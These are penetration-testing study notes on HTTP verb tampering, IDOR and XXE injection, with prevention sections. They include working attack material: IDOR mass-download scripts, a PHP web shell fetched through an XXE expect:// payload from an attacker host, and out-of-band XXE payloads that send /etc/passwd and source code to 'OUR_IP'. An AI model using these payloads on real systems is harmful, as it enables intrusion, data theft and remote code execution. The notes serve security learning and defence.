---
title: Notes | Web Attacks
author: Zeropio
date: 2022-08-02
categories: [Notes, Vulnerabilities]
tags: [xxe, idor, tampering]
permalink: /notes/vulnerabilities/web-attacks
---

As modern web applications become more complex and advanced, so do the types of attacks utilized against them. Attacking external-facing web applications may result in compromise of the businesses' internal network, which may eventually lead to stolen assets or disrupted services.

---

# HTTP Verb Tampering 

The HTTP protocol works by accepting various HTTP methods as verbs at the beginning of an HTTP request. While programmers mainly consider the two most commonly used HTTP methods, **GET** and **POST**, any client can send any other methods in their HTTP requests and then see how the web server handles these methods. If the web server configurations are not restricted to only accept the HTTP methods required by the web server, and the web application is not developed to handle other types of HTTP requests, then we may be able to exploit this insecure configuration to gain access to functionalities we do not have access to, or even bypass certain security controls.

HTTP has [nine different verbs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods). Apart from **GET** and **POST** these are some of the most common:

| **Verb**   | **Description**    |
|--------------- | --------------- |
| `HEAD` | Identical to a GET request, but its response only contains the headers, without the response body |
| `PUT` | Writes the request payload to the specified location | 
| `DELETE` | Deletes the resource at the specified location |
| `OPTIONS` | Shows different options accepted by a web server, like accepted HTTP verbs |
| `PATCH` | Apply partial modifications to the resource at the specified location | 

Insecure web server configurations cause the first type of **HTTP Verb Tampering** vulnerabilities. For example, a system admin may use the following configuration to require authentication on a particular web page:
```xml
<Limit GET POST>
    Require valid-user
</Limit>
```

Insecure coding practices cause the other type of HTTP Verb Tampering vulnerabilities. For example, if a web page was found to be vulnerable to a SQL Injection vulnerability, and the back-end developer mitigated the SQL Injection vulnerability by the following applying input sanitization filters:
```php
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
    ...
}
```

As we can see, only the **GET** is protected.

## Bypassing Basic Authentication 

Exploiting HTTP Verb Tampering vulnerabilities is usually a relatively straightforward process. The first type of HTTP Verb Tampering vulnerability is mainly caused by **Insecure Web Server Configurations**. We just need to try alternate HTTP methods to see how they are handled by the web server and the web application. To try and exploit the page, we need to identify the HTTP request method used by the web application. We can intercept the request in **Burp Suite** and examine it.

If the page uses a **GET** request, change it to a **POST**. (Right click in the Burp Repeater to change the method). If none of these work, try with the **HEAD** method. If we see something as:
```console
zero@pio$ curl -I http://<TARGET>/forbidden-page.php

HTTP/1.1 200 OK
Date: 
Server: Apache/2.4.41 (Ubuntu)
Allow: POST,OPTIONS,HEAD,GET
Content-Length: 0
Content-Type: httpd/unix-directory
```

We can see the **Allow** header, which specify which one we can use. Once we use the **HEAD** we bypass the securization. 

> Bypass is not limited to the **HEAD** method, try all of them.
{: .prompt-info}

## Bypassing Security Filters 

The other and more common type of HTTP Verb Tampering vulnerability is caused by **Insecure Coding** errors made during the development of the web application. This explotation is similar to the previous one. With trial and error until we get the correct one.

## Verb Tampering Prevention 

### Insecure Configuration 

HTTP Verb Tampering vulnerabilities can occur in most modern web servers, including **Apache**, **Tomcat**, and **ASP.NET**. The vulnerability usually happens when we limit a page's authorization to a particular set of HTTP verbs/methods, which leaves the other remaining methods unprotected.

The following is an example of a vulnerable configuration for an **Apache** web server, which is located in the site configuration file (`000-default.conf`{: .filepath}), or in a `.htaccess`{: .filepath} web page configuration file:
```xml
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <Limit GET>
        Require valid-user
    </Limit>
</Directory>
```

As the `<Limit GET>` keyword is being used, the `Require valid-user` setting will only apply to **GET** requests, leaving the page accessible through **POST** requests. Even if both **GET** and **POST** were specified, this would leave the page accessible through other methods, like **HEAD** or **OPTIONS**. The following example shows the same vulnerability for a **Tomcat** web server configuration, which can be found in the `web.xml`{: .filepath} file for a certain Java web application:
```xml
<security-constraint>
    <web-resource-collection>
        <url-pattern>/admin/*</url-pattern>
        <http-method>GET</http-method>
    </web-resource-collection>
    <auth-constraint>
        <role-name>admin</role-name>
    </auth-constraint>
</security-constraint>
```

We can see that the authorization is being limited only to the **GET** method with http-method, which leaves the page accessible through other HTTP methods. And this is an example for **ASP .NET** in the `web.config`{: .filepath}:
```xml
<system.web>
    <authorization>
        <allow verbs="GET" roles="admin">
            <deny verbs="GET" users="*">
        </deny>
        </allow>
    </authorization>
</system.web>
```

If we want to specify a single method, we can use safe keywords, like `LimitExcept` in Apache, `http-method-omission` in Tomcat, and `add`/`remove` in ASP.NET, which cover all verbs except the specified ones. Finally, to avoid similar attacks, we should generally consider disabling/denying all **HEAD** requests unless specifically required by the web application.

### Insecure Coding

Let's consider the following PHP code:
```php
if (isset($_REQUEST['filename'])) {
    if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) {
        system("touch " . $_REQUEST['filename']);
    } else {
        echo "Malicious Request Denied!";
    }
}
```

 The `preg_match` function properly looks for unwanted special characters and does not allow the input to go into the command if any special characters are found. However, the fatal error made in this case is not due to **Command Injections** but due to the inconsistent use of HTTP methods. We see that the `preg_match` filter only checks for special characters in **POST** parameters with `$_POST['filename']`. However, the final system command uses the `$_REQUEST['filename']` variable, which covers both **GET** and **POST** parameters. 

 To avoid HTTP Verb Tampering vulnerabilities in our code, **we must be consistent with our use of HTTP methods** and ensure that the same method is always used for any specific functionality across the web application. It is always advised to **expand the scope of testing in security filters** by testing all request parameters. This can be done with the following functions and variables:

 | **Language**   | **Function**    |
 |--------------- | --------------- |
 | PHP | `$_REQUEST['param']` |
 | Java | `request.getParameter('param')` |
 | C# | `Request['param']` |

---

# Insecure Direct Object References (IDOR)

IDOR vulnerabilities are among the most common web vulnerabilities and can significantly impact the vulnerable web application. IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects. Building a solid access control system is very challenging, which is why IDOR vulnerabilities are pervasive. For example, if users request access to a file they recently uploaded, they may get a link to it such as `download.php?file_id=123`. So, as the link directly references the file with `file_id=123`, what would happen if we tried to access another file with `download.php?file_id=124`?

Just exposing a direct reference to an internal object or resource is not a vulnerability in itself. However, this may make it possible to exploit another vulnerability: a **weak access control system**. There are many ways of implementing a solid access control system for web applications, like having a **Role-Based Access Control** (**RBAC**) system. The main takeaway is that **an IDOR vulnerability mainly exists due to the lack of an access control on the back-end**. If a user had direct references to objects in a web application that lacks access control, it would be possible for attackers to view or modify other users' data.

he most basic example of an IDOR vulnerability is accessing private files and resources of other users that should not be accessible to us, like personal files or credit card data, which is known as **IDOR Information Disclosure Vulnerabilities**. IDOR vulnerabilities may also lead to the elevation of user privileges from a standard user to an administrator user, with **IDOR Insecure Function Calls**.

## Identifying IDORs

### URL Parameters & APIs 

The very first step of exploiting IDOR vulnerabilities is identifying **Direct Object References**. These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies. In the most basic cases, we can try incrementing the values of the object references to retrieve other data. We can also use a fuzzing application to try thousands of variations and see if they return any data. Any successful hits to files that are not our own would indicate an IDOR vulnerability.

For example `?id=1`.

### AJAX Calls

We may also be able to identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls. Some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role.

The following example shows a basic example of an AJAX call:
```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

The above function may never be called when we use the web application as a non-admin user. However, if we locate it in the front-end code, we may test it in different ways to see whether we can call it to perform changes, which would indicate that it is vulnerable to IDOR. We can do the same with back-end code if we have access to it (open-source web applications).

### Understand Hashing/Encoding 

Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead. If we find such parameters using encoded or hashed values, we may still be able to exploit them if there is no access control system on the back-end.

For example `?id=MQ==`

### Compare User Roles 

If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests and object references. This may allow us to understand how the URL parameters and unique identifiers are being calculated and then calculate them for other users to gather their data.

For example, if we had access to two different users, one of which can view their salary after making the following API call:
```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```

The second user may not have all of these API parameters to replicate the call. However, we can try repeating the same API call while logged in as User2 to see if the web application returns anything.

## Mass IDOR Enumeration 

Once we identify a potential IDOR, we can start testing it with basic techniques to see whether it would expose any other data. As for advanced IDOR attacks, we need to better understand how the web application works, how it calculates its object references, and how its access control system works to be able to perform advanced attacks that may not be exploitable with basic techniques.

### Insecure Parameters

Take for example a employee web. We access with our account, identify by `?userid=1`. Navigatint through the files we see some files like `/documents/Invoice_1_09_2021.pdf`{: .filepath} and `/documents/Report_1_10_2021.pdf`{: .filepath}. Files with a simply pattern, the name, the userid and a date. This is called **Static File IDOR**. However, we only can guess files that start by **Invoice** and **Report**. 

Now it's time to change the id: `?userid=2`. If the back-end end of the web application does have a proper access control system, we will get some form of **Access Denied**. Now we can see similar files to our own, but changing the `1` by `2`.

### Mass Enumeration 

We can try manually accessing other employee documents with `uid=3`, `uid=4`, and so on. Manually accessing files is not efficient in a real work environment with hundreds or thousands of employees. So, we can either use a tool like Burp Intruder or ZAP Fuzzer to retrieve all files or write a small bash script to download all files, which is what we will do.

Checking the source code we can see something like:
```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

With cURL and grep we can start the enumeration:
```console
zero@pio$ curl -s "http://<TARGET>/documents.php?uid=1" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

With a simple bash script:
```bash
#!/bin/bash

url="http://<TARGET>"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

## Bypassing Encoded References 

In some cases, web applications make hashes or encode their object references, making enumeration more difficult, but it may still be possible. For example, after download a file we intercept in the POST:
```
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

Testing the format we find that It doesn't match with our id:
```console
zero@pio$ echo -n 1 | md5sum

c4ca4238a0b923820dcc509a6f75849b -
```

### Function Disclosure

As most modern web applications are developed using JavaScript frameworks, like **Angular**, **React**, or **Vue.js**, many web developers may make the mistake of performing sensitive functions on the front-end, which would expose them to attackers. We can find a download script, reference as `javascript:downloadContract('1')`. Searching in the source code we find that:
```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

We see it is encrypting `btoa(uid)`, which is the uid in base64. With all this information we can guess the hash:
```console
zero@pio$ echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```

> We are using the -n flag with echo, and the -w 0 flag with base64, to avoid adding newlines
{: .prompt-tip}

### Mass Enumeration 

Once again we can start enumerating all the data. We can generate a list of hashes for each user:
```console
zero@pio$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
8b9af1f7f76daf0f02bd9c48c4a2e3d0
006d1236aee3f92b8322299796ba1989
b523ff8d1ced96cef9c86492e790c2fb
d477819d240e7d3dd9499ed8d23e7158
3e57e65a34ffcb2e93cb545d024f5bde
5d4aace023dc088767b4e08c79415dcd
```

Or create a script:
```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://<TARGET>:PORT/download.php
    done
done
```

## IDOR in Insecure APIs

IDOR vulnerabilities may also exist in function calls and APIs, and exploiting them would allow us to perform various actions as other users. While **IDOR Information Disclosure Vulnerabilities** allow us to read various types of resources, **IDOR Insecure Function Calls** enable us to call APIs or execute functions as another user. 

### Identifying Insecure APIs 

Take for example a **Edit Profile** option. We intercept the request with Burp and see a JSON with all the information update, the parameter **PUT** and a URL like `/profile/api.php/profile/1`. Also the **PUT** has some hidden parameters, like **role** or **uuid**.

### Exploiting Insecure APIs 

There are a few things we could try in this case:
- Change our uid to another user's uid, such that we can take over their accounts
- Change another user's details, which may allow us to perform several web attacks
- Create new users with arbitrary details, or delete existing users
- Change our role to a more privileged role to be able to perform more actions
- Use **GET** to try IDOR Information Disclosure vulnerabilities 

The application may have some protections, not allowing to perform some of this. Try with all of them.

## Chaining IDOR Vulnerabilities 

Taking the example for before, we got blocked trying to update other user data, because even though we know their uid, the uuid doesn't match. After gathering all his info with the **GET**, we can modify our request to change their data.

### Chaining Two IDOR Vulnerabilities 

We can enumerate all the users. If we get a admin user we can modify our data to have the sames access as him.

By combining the information we gained from the **IDOR Information Disclosure vulnerability** with an **IDOR Insecure Function Calls** attack on an API endpoint, we could modify other users' details and create/delete users while bypassing various access control checks in place. On many occasions, the information we leak through IDOR vulnerabilities can be utilized in other attacks, like **IDOR** or **XSS**, leading to more sophisticated attacks or bypassing existing security mechanisms. 

## IDOR Prevention 

### Object-Level Access Control 

An Access Control system should be at the core of any web application since it can affect its entire design and structure. There are many ways to implement an RBAC system and map it to the web application's objects and resources, and designing it in the core of the web application's structure is an art to perfect. The following is a sample code of how a web application may compare user roles to objects to allow or deny access control:
```javascript
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}
```

User privileges must not be passed through the HTTP request, but mapped directly from the RBAC on the back-end using the user's logged-in session token as an authentication mechanism.

### Object Referencing

While the core issue with IDOR lies in broken access control (**Insecure**), having access to direct references to objects (**Direct Object Referencing**) makes it possible to enumerate and exploit these access control vulnerabilities. We may still use direct references, but only if we have a solid access control system implemented. For example, we can use UUID V4 to generate a strongly randomized id for any element, which looks something like `89c9b29b-d19f-4515-b2dd-abb6e693eb20`. Then, we can map this UUID to the object it is referencing in the back-end database, and whenever this UUID is called, the back-end database would know which object to return. The following example PHP code shows us how this may work:
```php
$uid = intval($_REQUEST['uid']);
$query = "SELECT url FROM documents where uid=" . $uid;
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result));
echo "<a href='" . $row['url'] . "' target='_blank'></a>";
```

---

# XML External Entity (XXE) Injection 

**XXE Injection** vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions. **Extensible Markup Language** (**XML**) is a common markup language (similar to HTML and SGML) designed for flexible transfer and storage of data and documents in various types of applications. XML documents are formed of element trees, where each element is essentially denoted by a tag, and the first element is called the root element, while other elements are child elements. An example:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@zerop.io</sender>
  <recipients>
    <to>HR@zerop.io</to>
    <cc>
        <to>billing@zerop.io</to>
        <to>payslips@zerop.io</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body> 
</email>
```

Some elements of a XML file are:

| **Key**    | **Definition**    | **Example**    |
|---------------- | --------------- | --------------- |
| Tag | The keys of an XML document, usually wrapped with (`<`/`>`) characters | `<date>` |
| Entity | XML variables, usually wrapped with (`&`/`;`) characters | `&lt;` |
| Element | The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag | `<date>01-01-2022</date>` | 
| Attribute | Optional specifications for any element that are stored in the tags, which may be used by the XML parser | `version="1.0"`/`encoding="UTF-8"` |
| Declaration | Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it | `<?xml version="1.0" encoding="UTF-8"?>` | 

Furthermore, some characters are used as part of an XML document structure, like `<`, `>`, `&`, or `"`. So, if we need to use them in an XML document, we should replace them with their corresponding entity references (e.g. `&lt;`, `&gt;`, `&amp;`, `&quot;`). Finally, we can write comments in XML documents between `<!--` and `-->`, similar to HTML documents.

**XML Document Type Definition** (**DTD**) allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file. The following is an example DTD for the XML document we saw earlier:
```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

As we can see, the DTD is declaring the root **email** element with the **ELEMENT** type declaration and then denoting its child elements. After that, each of the child elements is also declared, where some of them also have child elements, while others may only contain raw data (as denoted by **PCDATA**). 

We may also define custom entities in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the ENTITY keyword, which is followed by the entity name and its value, as follows:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Zeropio">
]>
```

Once we define an entity, it can be referenced in an XML document between an ampersand `&` and a semi-colon `;` (e.g. `&company;`). Whenever an entity is referenced, it will be replaced with its value by the XML parser. Most interestingly, however, we can reference External XML Entities with the **SYSTEM** keyword, which is followed by the external entity's path, as follows:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

>  We may also use the **PUBLIC** keyword instead of **SYSTEM** for loading external resources, which is used with publicly declared entities and standards, such as a language code 
{: .prompt-tip}

## Local File Disclosure 

When a web application trusts unfiltered XML data from user input, we may be able to reference an external XML DTD document and define new custom XML entities. The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input. For example a **Contact Form**. Take the following example:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
  <name>Zero</name>
  <tel>1</tel>
  <email>zero@pm.me</email>
  <message>
    Pwned!
  </message>
</root>
```

Intercept the request and check it. If we see XML format we can start testing. Suppose the web application uses outdated XML libraries, and it does not apply any filters or sanitization on our XML input. In that case, we may be able to exploit this XML form to read local files. Take for example that one of the field is being printed after sending it (for example our email after the Contact Form). Also check the source code, some values can be displaying there.

Start creating a new Entity, for example `<!ENTITY test "This is a test">`.

> If in the HTTP request had no DTD being declared within the XML data itself, or being referenced externally, so we added a new DTD before defining our entity. If the **DOCTYPE** was already declared in the XML request, we would just add the **ENTITY** element to it.
{: .prompt-tip}

For example:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY test "This is a test">
]>
<root>
  <name>Zero</name>
  <tel>1</tel>
  <email>&test;</email>
  <message>
    Pwned!
  </message>
</root>
```

If the ENTITY test is display, we have our XXE.

> Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an online tool. If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.
{: .prompt-tip}

### Reading Sensitive Files 

We'll just add the SYSTEM keyword and define the external reference path after it:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

>  In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.
{: .prompt-tip}

### Reading Source Code

Another benefit of local file disclosure is the ability to obtain the source code of the web application. So, let us see if we can use the same attack to read the source code of the index.php file, as follows:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file://index.php">
]>
```

This don't work because the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity. If a file contains some of XML's special characters (`<`/`>`/`&`), it would break the external entity reference and not be used for the reference. PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

**This trick only works with PHP web applications**.

### Remote Code Execution with XXE 

n addition to reading local files, we may be able to gain code execution over the remote server. The easiest method would be to look for ssh keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server. If these do not work, we may still be able to execute commands on PHP-based web applications through the `PHP://expect` filter, though this requires the PHP expect module to be installed and enabled. 

If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as `expect://id`, and the page should print the command output. However, if we did not have access to the output, or needed to execute a more complicated command (reverse shell), then the XML syntax may break and the command may not execute. 

The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:
```console
zero@pio$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php 
zero@pio$ python3 -m http.server 80
```

Now use the following XML:
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'<OUR IP>/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

We replaced all spaces in the above XML code with `$IFS`. 

### Other XXE Attacks 

Another common attack often carried out through XXE vulnerabilities is SSRF exploitation, which is used to enumerate locally open ports and access their pages, among other restricted web pages, through the XXE vulnerability. One common use of XXE attacks is causing a Denial of Service (DOS) to the hosting web server, with the use the following payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

However, this attack no longer works with modern web servers, as they protect against entity self-reference.

## Advanced File Disclosure 

Not all XXE vulnerabilities may be straightforward to exploit. Some file formats may not be readable through basic XXE, while in other cases, the web application may not output any input values in some instances, so we may try to force it through errors. 

### Advanced Exfiltration with CDATA 

We can utilize another method to extract any kind of data (including binary data) for any web application backend, regardless of the language used. To output data that does not conform to the XML format, we can wrap the content of the external file reference with a **CDATA** tag ( `<![CDATA[ FILE_CONTENT ]]>`). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters. 

One easy way to tackle this issue would be to define a **begin** internal entity with `<![CDATA[, an **end** internal entity with ]]>`, and then place our external entity file in between, and it should be considered as a CDATA element, as follows:
```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

After that, if we reference the `&joined;` entity, it should contain our escaped data. However, this will not work, since XML prevents joining internal and external entities. To bypass this limitation, we can utilize XML Parameter Entities, a special type of entity that starts with a `%` character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source, then all of them would be considered as external and can be joined, as follows:
```xml
<!ENTITY joined "%begin;%file;%end;">
```

So, let's try to read the submitDetails.php file by first storing the above line in a DTD file, host it on our machine, and then reference it as an external entity on the target web application, as follows:
```console
zero@pio$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd 
zero@pio$ python3 -m http.server 8000
```

Now, we can reference our external entity and then print the `&joined;` entity we defined above, which should contain the content of the submitDetails.php file, as follows:
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

> In some modern web servers, we may not be able to read some files, as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop), as mentioned in the previous section.
{: .prompt-alert}

### Error Based XXE 

Another situation we may find ourselves in is one where the web application might not write any output, so we cannot control any of the XML input entities to write its content. In such cases, we would be **blind** to the XML output and so would not be able to retrieve the file content using our usual methods. f the web application displays runtime errors and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit.

First, let's try to send malformed XML data, and see if the web application displays any errors. To do so, we can delete any of the closing tags, change one of them or just reference a non-existing entity. If it display an error we can exploit this flaw to exfiltrate file content. To do so, we will use a similar technique to what we used earlier. First, we will host a DTD file that contains the following payload:
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

The above payload defines the file parameter entity and then joins it with an entity that does not exist. In our previous exercise, we were joining three strings. In this case, `%nonExistingEntity;` does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined `%file;` as part of the error. There are many other variables that can cause an error, like a bad URI or having bad characters in the referenced file. Now, we can call our external DTD script, and then reference the error entity, as follows:
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

However, this method is not as reliable as the previous method for reading source files, as it may have length limitations, and certain special characters may still break it.

## Blind Data Exfiltration 

### Out-of-bound Data Exfiltration

When we have no way to have anything printed on the web application response we can utilize a method known as **Out-of-bound** (**OOB**) **Data Exfiltration**, which is often used in similar blind cases with many web attacks, like blind SQL injections, blind command injections, blind XSS,... We will make the web application send a web request to our web server with the content of the file we are reading.

To do so, we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the file parameter value as part of the URL being requested over HTTP, as follows:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

When the XML tries to reference the external oob parameter from our machine, it will request http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB. Finally, we can decode the WFhFX1NBTVBMRV9EQVRB string to get the content of the file. We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal:
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

In the same folder as the previous file (**index.php**):
```console
zero@pio$ php -S 0.0.0.0:8000
```

Now, to initiate our attack, we can use a similar payload to the one we used in the error-based attack, and simply add <root>&content;</root>, which is needed to reference our entity and have it send the request to our machine with the file content:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

Send to the page and check the http open.

### Automated OOB Exfiltration

We can use [XXEinjector](https://github.com/enjoiz/XXEinjector) to automatiza the explotation. This tool supports includes basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE. Copy the Burp request without the XML data, add `XXEINJECT`:
```
<HEADERS>
...

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Now run the tool:
```console
zero@pio$ ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `--host=<HOST>` | Select the host for the attack |
| `--httpport=<PORT>` | Select our port for the attack | 
| `--file=<PATH>` | Request | 
| `--path=<PATH>` | File we want to read |
| `--oob=http` and `--phpfilter` | Do a OOB attack |

All exfiltrated files get stored in the `Logs`{: .filepath} folder under the tool.

## XXE Prevention 

### Avoiding Outdated Components 

While other input validation web vulnerabilities are usually prevented through secure coding practices, this is not entirely necessary to prevent XXE vulnerabilities. This is because XML input is usually not handled manually by the web developers but by the built-in XML libraries instead. So, if a web application is vulnerable to XXE, this is very likely due to an outdated XML library that parses the XML data.

### Using Safe XML Configurations

Other than using the latest XML libraries, certain XML configurations for web applications can help reduce the possibility of XXE exploitation. These include:
- Disable referencing custom Document Type Definitions (DTDs)
- Disable referencing External XML Entities
- Disable Parameter Entity processing
- Disable support for XInclude
- Prevent Entity Reference Loops

We should always have proper exception handling in our web applications and should always disable displaying runtime errors in web servers. With the various issues and vulnerabilities introduced by XML data, many also recommend using other formats, such as JSON or YAML. This also includes avoiding API standards that rely on XML (SOAP) and using JSON-based APIs instead (REST).

